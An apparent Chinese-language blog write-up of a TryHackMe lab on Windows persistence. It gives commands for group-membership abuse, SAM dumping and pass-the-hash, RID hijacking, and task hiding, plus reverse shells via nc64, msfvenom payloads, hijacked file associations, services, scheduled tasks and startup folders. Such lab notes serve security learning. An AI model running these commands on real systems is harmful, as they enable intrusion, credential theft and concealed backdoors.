<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Windows权限维持 | deCOLE's Blog</title><meta name="author" content="deCOLE"><meta name="copyright" content="deCOLE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Windows权限维持">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows权限维持">
<meta property="og:url" content="http://example.com/2025/03/18/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html">
<meta property="og:site_name" content="deCOLE&#39;s Blog">
<meta property="og:description" content="Windows权限维持">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/bnb.jpg">
<meta property="article:published_time" content="2025-03-17T16:00:00.000Z">
<meta property="article:modified_time" content="2025-03-18T06:00:38.939Z">
<meta property="article:author" content="deCOLE">
<meta property="article:tag" content="TryHackMe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/bnb.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Windows权限维持",
  "url": "http://example.com/2025/03/18/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
  "image": "http://example.com/img/bnb.jpg",
  "datePublished": "2025-03-17T16:00:00.000Z",
  "dateModified": "2025-03-18T06:00:38.939Z",
  "author": [
    {
      "@type": "Person",
      "name": "deCOLE",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/touxiang.jpg"><link rel="canonical" href="http://example.com/2025/03/18/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Windows权限维持',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">deCOLE's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Windows权限维持</span></a></span><div id="menus"></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Windows权限维持</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-18T06:00:38.939Z" title="更新于 2025-03-18 14:00:38">2025-03-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h2 id="Windows权限维持"><a href="#Windows权限维持" class="headerlink" title="Windows权限维持"></a>Windows权限维持</h2><h3 id="篡改非特权账户"><a href="#篡改非特权账户" class="headerlink" title="篡改非特权账户"></a>篡改非特权账户</h3><h4 id="分配组成员资格"><a href="#分配组成员资格" class="headerlink" title="分配组成员资格"></a>分配组成员资格</h4><p>​	在这部分任务中，我们假设的前提是：攻击者已经转储了受害者机器的hash,并成功破解了所使用的非特权账户的密码</p>
<p>使得非特权用户能获得管理权限的最直接的方法就是:使其成为Administrators组的一部分</p>
<p>命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators thmuser0 /add</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251008700.png?raw=true" alt="image-20241225100807560"></p>
<p>这将允许我们使用RDP、WinRM或者其他任何可用的远程管理服务，来访问服务器</p>
<p>为了降低可疑程度，可用Backup Operators组</p>
<p>此组中的用户将没有管理权限，但是可用读取、写入系统上的任何文件或注册表项，并且忽略任何已配置的DACL。这样我们就可以复制SAM和SYSTEM注册表配置单元的内容，然后恢复所有用户的密码hash，从而使得我们能升到Administrator</p>
<p>在此之前首先我们要将账户添加到Backup Operators组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net localgroup &quot;Backup Operators&quot; thmuser1 /add</span><br></pre></td></tr></table></figure>

<p>由于这是一个非特权帐户，因此除非我们将其添加到<strong>远程桌面用户</strong> （RDP） 或<strong>远程管理用户</strong> （WinRM） 组，否则它无法通过 RDP 或 WinRM 返回计算机。我们将使用 WinRM 完成此任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net localgroup &quot;Remote Management Users&quot; thmuser1 /add</span><br></pre></td></tr></table></figure>

<p>我们假设我们已经在服务器上转储了凭据，并且拥有 thmuser1 的密码。让我们使用 WinRM 的凭据通过 WinRM 进行连接</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251024853.png?raw=true" alt="image-20241225102452729"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.143.188 -u thmuser1 -p Password321</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251035048.png?raw=true" alt="image-20241225103546917"></p>
<p>查看组成员</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202503171722549.png?raw=true" alt="image-20241225103709468"></p>
<p>虽然我们是Backup Operators的一部分，但该组已被禁用了</p>
<p>这是用户账户控制造成的（UAC）</p>
<p>UAC实现的功能之一是<strong>LocalAccountTokenFilterPolicy</strong>，这使得在远程登录的时候会剥夺任何本地账户的管理权限</p>
<p>虽然我们可用图形用户会话通过UAC提权，但如果用的是WInRM，我们就只能用没有管理权限的有限访问令牌</p>
<p>为了重新获得管理权限，我们通过更改注册表项来禁用<strong>LocalAccountTokenFilterPolicy</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251101111.png?raw=true" alt="image-20241225110133983"></p>
<p>这样我们就可用使用我们的后门用户了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.143.188 -u thmuser1 -p Password321</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251105942.png?raw=true" alt="image-20241225110511779"></p>
<p>于是我们可以备份SAM和SYSTEM文件，并把它们下载到我们的攻击机上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system system.bak</span><br><span class="line">reg save hklm\sam sam.bak</span><br><span class="line">download system.bak</span><br><span class="line">download sam.bak</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251109267.png?raw=true" alt="image-20241225110954124"></p>
<p>然后就可以用工具转储所有用户密码的hash了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251110660.png?raw=true" alt="image-20241225111046519"></p>
<p>然后执行Pass-the-Hash连接到Administrator账户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.143.188 -u Administrator -H f3118544a831e728781d780cfdb9c1fa</span><br></pre></td></tr></table></figure>

<p>然后执行flag1.exe即可</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251123387.png?raw=true" alt="image-20241225112303266"></p>
<h4 id="特殊权限和安全描述符"><a href="#特殊权限和安全描述符" class="headerlink" title="特殊权限和安全描述符"></a>特殊权限和安全描述符</h4><p>​	和将用户添加到Backup Operators组类似的结果，可以在不修改任何组成员身份的情况下实现</p>
<p>特殊组被称为特殊组的原因是：操作系统默认为它们分配了特定的权限。<em>权限只是在系统本身上执行任务的一种能力</em>，包括一些简单的事情，比如获得文件所有权、关闭服务器</p>
<p>对于Backup Operators组，默认情况下会分配两个权限</p>
<ul>
<li><strong>SeBackupPrivilege 的</strong>用户可以读取系统中的任何文件，而忽略任何现有的 DACL。</li>
<li><strong>SeRestorePrivilege 的</strong>用户可以在系统中写入任何文件，而忽略任何现有的 DACL。</li>
</ul>
<p>前面我们说了，权限只是在系统本身上执行任务的一种能力</p>
<p>那么我们就可以将这种能力交给其他用户，从而使其不受组成员身份的影响</p>
<p>可以使用命令，将当前配置导出到一个临时文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /export /cfg config.inf</span><br></pre></td></tr></table></figure>

<p>然后输入config.inf打开</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251202003.png?raw=true" alt="image-20241225120234867"></p>
<p>然后往里面添加我们的用户</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251206302.png?raw=true" alt="image-20241225120614158"></p>
<p>保存后，将.inf文件转换成.sdb文件，然后把该文件配置重新加载回系统</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secedit /import /cfg config.inf /db config.sdb</span><br><span class="line"></span><br><span class="line">secedit /configure /db config.sdb /cfg config.inf</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251209869.png?raw=true" alt="image-20241225120904738"></p>
<p>现在我们拥有了一个和Backup操作员具有相同权限的用户thmuser2。</p>
<p>然而该用户仍然无法通过WinRM登录系统，因此我们接下来还需要更改与WinRM服务关联的安全描述符，以允许thmuser2连接。</p>
<p>我们将安全描述符视为ACL*(Access Control List，访问控制列表)*，应用于其他系统工具</p>
<p>要打开WinRM安全描述符的配置窗口，可以在Powershell中使用以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI</span><br></pre></td></tr></table></figure>

<p>接着会弹窗，我们需要添加thmuser2用户，并为其分配WinRM连接的权限</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251214397.png?raw=true" alt="image-20241225121427245"></p>
<p>完成操作后，thmuser就可以通过WinRM进行连接了。由于用户具有SeBackup和SeRestore的权限，我们可以重复上一个小任务点的方法继续获取权限</p>
<p><em>请注意，要使此用户完全使用给定的权限，必须更改 <strong>LocalAccountTokenFilterPolicy</strong> 注册表项，但我们已经这样做以获取上一个flag</em></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251218067.png?raw=true" alt="image-20241225121816915"></p>
<h4 id="RID劫持"><a href="#RID劫持" class="headerlink" title="RID劫持"></a>RID劫持</h4><p>还有一种无需管理员身份，即可获取管理员权限的办法是：更改某些注册表值，使操作系统认为我们是管理员</p>
<p>创建用户的时候，会为其分配一个名为<strong>Relative ID （RID）</strong> 的标识符。RID 只是一个数字标识符，表示整个系统中的用户</p>
<p>用户登陆时，LSASS进程从SAM注册表配置单元中获取用户的RID，并创建与该RID相关联的访问令牌，如果我们可以篡改注册表值，就能将同一个RID关联到两个账户，使得Windows将管理员访问令牌分配给非特权用户</p>
<p>在任何Windows系统当中，默认管理员账户的 <strong>RID &#x3D; 500</strong>，普通用户的<strong>RID通常为&gt;&#x3D;1000</strong></p>
<p>通过以下命令查找为任何用户分配的RID</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251223506.png?raw=true" alt="image-20241225122326371"></p>
<p>RID 是 SID 的最后一位（thmuser3 为 1010，管理员为 500）。SID 是一个标识符，它允许操作系统跨域识别用户，但对于此任务，我们不会过多考虑它的其余部分</p>
<p>现在我们只需要将 RID&#x3D;500 分配给 thmuser3。为此，我们需要使用 Regedit 访问 SAM。SAM 仅限于 SYSTEM 帐户，因此即使是管理员也无法对其进行编辑。要以 SYSTEM 方式运行 Regedit，我们将使用 psexec，它在您的机器上可用：<code>C:\tools\pstools</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -i -s regedit</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251241620.png?raw=true" alt="image-20241225124109467"></p>
<p>从 Regedit，我们将转到计算机中每个用户都有一个密钥的位置。由于我们想要修改 thmuser3，因此我们需要搜索一个 RID（十六进制 （1010 &#x3D; 0x3F2）的密钥。在相应的 key 下，将有一个名为 <strong>F</strong> 的值，该值保存位置 0x30 处的用户有效 RID：<code>HKLM\SAM\SAM\Domains\Account\Users\</code></p>
<p>现在，我们将这两个字节替换成十六进制的Administrator RID（500 &#x3D; 0x01F4），并切换字节 (F401)</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412251242113.png?raw=true" alt="image-20241225124237975"></p>
<p>当我们用thmuser3登录时，LSASS会将其与管理员相同的RID相关联，并且赋予他们同等的权限</p>
<p>用RDP连接拿flag</p>
<h3 id="后门文件"><a href="#后门文件" class="headerlink" title="后门文件"></a>后门文件</h3><p>这个学web基本都知道咋回事，就不细述了，记录一个自己没看过的</p>
<p><strong>劫持文件关联</strong></p>
<p>除了通过可执行文件或快捷方式进行权限维持外，我们还可以劫持文件关联，以此来强制操作系统在用户打开特定文件类型时，运行我们的shell</p>
<p>默认操作系统文件关联保存在注册表中，并且存储了每种文件类型的键</p>
<p>假如我们想检查哪个程序用于打开.txt文件，我们只需要检查子密钥，并查找与之关联的Programmatic ID（ProgID），ProgID就是系统上安装的程序的标识符。</p>
<p>对于.txt文件，我们将具有以下ProgID</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\Software\Classes\.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261351210.png?raw=true" alt="image-20241226135132045"></p>
<p>接下来我们可以搜索相应的ProgID的子项</p>
<p>大多数ProgID条目都有一个子项，在该子项下指定要为具有该扩展名的文件运行的默认命令是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\Software\Classes\txtfileshell\open\command</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261356497.png?raw=true" alt="image-20241226135632361"></p>
<p>我们可以劫持这个扩展，将命令替换为执行后门，然后保存</p>
<p>这样当目标使用扩展的时候，就会自动执行我们的后门文件</p>
<p>接下来我们先创建一个psl脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Start-Process -NoNewWindow &quot;c:\tools\nc64.exe&quot; &quot;-e cmd.exe 10.10.29.57 4448&quot;</span><br><span class="line">C:\Windows\system32\NOTEPAD.EXE $args[0]</span><br></pre></td></tr></table></figure>

<p>然后将其保存到<code>%SystemRoot%\system32\NOTEPAD.EXE %1%1C:\Windows\backdoor2.ps1</code></p>
<p>请注意，在 Powershell 中，我们必须传递给记事本，因为它将包含要打开的文件的名称，如 .<code>$args[0]``%1</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -WindowStyle hidden backdoor.ps1 %1</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261415307.png?raw=true" alt="image-20241226141553184"></p>
<p>然后在攻击机上起一个nc监听端口，运行txt文本来触发后门</p>
<p>实测能弹powershell，然而后门运行有点慢</p>
<h3 id="滥用服务"><a href="#滥用服务" class="headerlink" title="滥用服务"></a>滥用服务</h3><p>服务基本上是在后台运行的可执文件</p>
<p>这就为我们提供了一种权限维持的好方法，如果我们可以利用服务运行我们的后门，那么我们就可以在每次启动受害者的计算机时，重新获得对它的控制权</p>
<p>滥用服务来维权主要是通过以下两种手段：</p>
<ol>
<li>创建新服务</li>
<li>修改现有服务</li>
</ol>
<h4 id="创建后门服务"><a href="#创建后门服务" class="headerlink" title="创建后门服务"></a>创建后门服务</h4><p>我们可以用以下命令创建并启动一个THMservice服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe create THMservice binPath= &quot;net user Administrator Passwd123&quot; start= auto</span><br><span class="line">sc.exe start THMservice</span><br></pre></td></tr></table></figure>

<p><em>等号后必须要有空格，命令才能正常工作</em></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261436482.png?raw=true" alt="image-20241226143628361"></p>
<p>当启动这个服务时，将执行net user命令，将管理员的密码重置为passwd123</p>
<p>我们将服务设置为自启动 （start&#x3D; auto），这样就能在不与用户交互的情况下运行</p>
<p>我们也可以用msfvenom创建一个反弹shell的可执行文件，并将其与创建的服务相关联</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.29.57 LPORT=4448 -f exe-service -o rev-svc.exe</span><br></pre></td></tr></table></figure>

<p>然后将生成的rev-svc.exe复制到目标系统</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261457165.png?raw=true" alt="image-20241226145730032"></p>
<p>然后将binPath指向<code>C:\Windows</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe create THMservice2 binPath= &quot;C:\windows\rev-svc.exe&quot; start= auto</span><br><span class="line">sc.exe start THMservice2</span><br></pre></td></tr></table></figure>

<p>攻击机上监听端口就能收到反弹回来的shell</p>
<h4 id="修改现有服务"><a href="#修改现有服务" class="headerlink" title="修改现有服务"></a>修改现有服务</h4><p>创建新服务固然是好选择，但是在真正的攻防当中，蓝队可能会检测网络中的新服务创建</p>
<p>通常来说，任何已禁用的服务都是一个不错的目标，因为用户不一定能注意得到这些被禁用的服务的修改</p>
<p>使用以下命令获取可用服务列表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe query state=all</span><br></pre></td></tr></table></figure>

<p>找到一个THMService3，它已停止服务</p>
<p>查询服务配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe qc THMService3</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261513076.png?raw=true" alt="image-20241226151321949"></p>
<p>在维持权限时，我们需要关心三件事</p>
<ul>
<li>可执行文件（<strong>BINARY_PATH_NAME</strong>）应指向我们的payload</li>
<li>服务的<strong>START_TYPE</strong>应该是自动的，这样我们就能使得payload能在没有用户交互的情况下运行</li>
<li><strong>SERVICE_START_NAME</strong>（服务运行下的账户）最好设置为<strong>LocalSystem</strong>，以获取SYSTEM权限</li>
</ul>
<p>用msfvenom生成exe的步骤还是一样，只不过我们要重新配置THMservice3的参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc.exe config THMservice3 binPath= &quot;C:\Windows\rev-svc2.exe&quot; start= auto obj= &quot;LocalSystem&quot;</span><br></pre></td></tr></table></figure>

<p>可以注意到我们将start设置为了auto</p>
<p>obj设置为了LocalSystem，这里的obj参数全称是ObjectName，用于指定服务运行所使用的账户</p>
<p>然后binPath指向我们的可执行文件</p>
<p>其实还挺简单的，只不过操作上面还是不熟练</p>
<h3 id="滥用计划任务"><a href="#滥用计划任务" class="headerlink" title="滥用计划任务"></a>滥用计划任务</h3><p>在先前的提权部分我们就用过计划任务，其实在权限维持中也是能用的</p>
<h4 id="计划任务程序"><a href="#计划任务程序" class="headerlink" title="计划任务程序"></a>计划任务程序</h4><p>最常见的计划任务利用就是使用内置的<strong>Windows计划任务程序（schtasks）</strong></p>
<p>我们可以创建一个每分钟运行一次反弹shell命令的任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr &quot;c:\tools\nc64 -e cmd.exe 10.10.29.57 4449&quot; /ru SYSTEM</span><br></pre></td></tr></table></figure>

<p>但在真实的攻击场景下，这样频繁的操作极有可能暴露自身，在THM中这样设置只是因为我们不想等太久罢了</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261534586.png?raw=true" alt="image-20241226153449457"></p>
<p>然后在我们的攻击机上监听端口，接收shell</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261535805.png?raw=true" alt="image-20241226153525686"></p>
<p>前面的命令将创建一个 “THM-TaskBackdoor” 任务，并执行一个反向 shell 返回给攻击者。和 选项指示任务应每分钟运行一次。该选项指示任务将使用 SYSTEM 权限运行</p>
<p>若不确定自己的任务是否已成功创建，可以用下面的命令来查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /tn thm-taskbackdoor</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261537143.png?raw=true" alt="image-20241226153710022"></p>
<h4 id="隐藏计划任务"><a href="#隐藏计划任务" class="headerlink" title="隐藏计划任务"></a>隐藏计划任务</h4><p>成功用计划任务拿到权限后，如果我们没有及时隐藏自己的行踪，就可能会在受害者列出计划任务的时候暴露</p>
<p>为了计划任务的隐蔽性，我们可以删除其安全描述符**（SD）**，使其对系统中的任何用户都不可见。</p>
<p>安全描述符只是一个ACL，用于说明哪些用户有权限访问计划任务</p>
<p>如果我们的用户不允许查询计划任务，我们就看不到对应的计划任务，因为Windows仅显示我们有权限使用的任务</p>
<p>删除SD，等同于禁止所有用户（包括管理员）访问计划任务</p>
<p>所有计划任务的安全描述符都存储在注册表中，每个任务的注册表项中名为“SD”的值包含安全描述符。</p>
<p>只有当我们拥有SYSTEM权限时，我们才能擦除该值</p>
<p>在隐藏前，再确认一遍我们的计划任务</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261613812.png?raw=true" alt="image-20241226161313679"></p>
<p>然后用SYSTEM权限打开注册表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\tools\pstools\PsExec64.exe -s -i regedit</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261616650.png?raw=true" alt="image-20241226161634519"></p>
<p>删除SD值</p>
<p>再查询这个服务，系统会告诉我们没有这个服务</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261811214.png?raw=true" alt="image-20241226181150073"></p>
<h3 id="登录触发维权"><a href="#登录触发维权" class="headerlink" title="登录触发维权"></a>登录触发维权</h3><p>用户执行的某些操作也可能绑定上payload</p>
<p>比如登录系统</p>
<h4 id="启动文件夹"><a href="#启动文件夹" class="headerlink" title="启动文件夹"></a>启动文件夹</h4><p>每个用户都有自己的一个文件夹，可以在这个文件夹下放置我们希望用户登陆时运行的可执行文件</p>
<p>不过，每个用户仅运行其文件夹中的可用内容</p>
<p>路径为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;your_username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>

<p>把your_username替换成目标的用户名就行</p>
<p>如果我们想强制所有用户在登陆时运行我们的payload，我们可以在下面这个文件夹中用相同的方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br></pre></td></tr></table></figure>

<p>我们先用msfvenom生成反弹shell的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe</span><br></pre></td></tr></table></figure>

<p>然后将payload复制到目标计算机当中，当然可以在目标主机上使用python3启动web服务，利用wget来拉取我们的payload</p>
<p>复制成功后，将payload存到目标文件夹下，达到无论谁登录系统，都会触发反弹shell的payload的目的</p>
